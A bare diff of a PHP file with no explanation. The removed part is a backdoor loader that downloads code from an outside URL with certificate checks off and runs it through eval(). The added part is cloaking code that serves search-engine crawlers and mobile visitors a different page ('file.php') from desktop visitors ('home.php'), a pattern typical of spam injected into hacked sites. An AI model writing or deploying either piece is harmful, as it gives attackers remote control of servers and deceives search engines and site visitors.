@@ -1,43 +1,40 @@
 <?php
-session_start();
+$bot_user_agents = array(
+    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", "Storebot-Google", "Google-InspectionTool",
+    "GoogleOther", "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", "Google-Extended", "APIs-Google",
+    "AdsBot-Google-Mobile", "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", "Google-Favicon", "Google Favicon",
+    "Googlebot-Favicon", "Google-Site-Verification", "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", "Bingbot",
+    "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebookexternalhit", "ia_archiver",
+    "Alexa Crawler", "AhrefsBot", "Semrushbot"
+);
 
-/**
-* Disable error reporting
-*
-* Set this to error_reporting( -1 ) for debugging.
-*/
-function geturlsinfo($url) {
-   if (function_exists('curl_exec')) {
-       $conn = curl_init($url);
-       curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-       curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-       curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-       curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-       curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
 
-       // Set cookies using session if available
-       if (isset($_SESSION['SAP'])) {
-           curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
-       }
-
-       $url_get_contents_data = curl_exec($conn);
-       curl_close($conn);
-   } elseif (function_exists('file_get_contents')) {
-       $url_get_contents_data = file_get_contents($url);
-   } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-       $handle = fopen($url, "r");
-       $url_get_contents_data = stream_get_contents($handle);
-       fclose($handle);
-   } else {
-       $url_get_contents_data = false;
-   }
-   return $url_get_contents_data;
+function is_bot($user_agent, $bot_user_agents) {
+    foreach ($bot_user_agents as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
 }
 
-
- {
-   $a = geturlsinfo('https://catering-sore.pages.dev/');
-   eval('?>' . $a);
+function is_mobile($user_agent) {
+    $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
+    foreach ($mobile_agents as $mobile) {
+        if (stripos($user_agent, $mobile) !== false) {
+            return true;
+        }
+    }
+    return false;
 }
 
+// Combined conditions for including 'landingpage.php'
+if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
+    include 'file.php';
+    exit;
+} else {
+    include 'home.php';
+    exit;
+}
 ?>
